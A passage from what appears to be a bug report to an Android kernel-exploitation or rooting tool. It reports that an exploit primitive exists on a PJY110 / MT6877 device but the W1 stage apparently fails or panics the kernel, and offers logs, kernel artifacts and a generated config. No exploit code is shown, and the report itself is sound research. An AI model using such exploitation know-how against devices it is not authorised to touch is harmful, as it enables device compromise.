3. Would you want a `SUPPORTED_DEVICES.md` entry for the *negative* result (primitive present but
   W1 unreachable / extremely low pass rate), so other PJY110 / MT6877 users don't repeat the same
   search? Happy to send a PR if so — no profile would be shipped, since I have not verified a
   successful run.

## Reproduce / artifacts I can provide

Everything below is ready and I can attach or paste on request (all generated from the stock
`PJY110domestic_11_15.0.0.1600CN01_2026010716160222.zip` OTA, nothing from a modified device):

- full `ghostlock-extract --analysis` text and `--format json` output
- the generated `PJY110-6.6.82.conf`
- full `logcat -b all` capture of a run up to the panic (25k lines)
- the extracted `boot.img` kernel segment and the parsed `.BTF` header
- `run_state.json` from each attempt

Environment used: `main` @ `289b5c6`, `./gradlew :app:assembleDebug` (AGP 9.1.0, Kotlin 2.4.20,
NDK r28, `platforms;android-37.2`), no source modifications beyond a local `local.properties`.

Thanks for the work on this — the extractor's BTF handling and the fail-closed profile validation
made this analysis possible without ever needing to guess at offsets.
